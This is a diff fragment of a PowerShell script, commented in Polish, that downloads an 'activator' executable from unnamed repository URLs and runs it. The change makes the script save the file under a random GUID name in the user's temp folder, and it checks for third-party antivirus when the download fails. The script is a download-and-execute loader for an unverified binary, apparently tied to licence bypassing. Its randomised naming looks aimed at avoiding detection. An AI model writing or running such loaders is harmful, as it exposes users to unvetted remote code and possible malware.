@@ -12,8 +12,9 @@ foreach ($URL in $URLs | Sort-Object { Get-Random }) {
         Write-Host "Failed to download from $URL"
     }
 }
-
-if (-not (Test-Path "$env:SystemRoot\Temp\tempFile.exe")) {
+$rand = [Guid]::NewGuid().Guid
+$path = "$env:temp\$rand.exe"
+if (-not (Test-Path "$path")) {
     Check3rdAV
     Write-Host "Failed to download activator from repositories! Quitting..."
     return
@@ -39,9 +40,9 @@ function CheckFile {
 }
 
 # Sprawdzanie, czy plik został zapisany poprawnie
-CheckFile "$env:SystemRoot\Temp\tempFile.exe"
+CheckFile "$path"
 
 # Uruchomienie pliku .exe w tym samym oknie PowerShell
-Start-Process -FilePath "$env:SystemRoot\Temp\tempFile.exe" -PassThru -Wait
+Start-Process -FilePath "$path" -PassThru -Wait
 
 exit
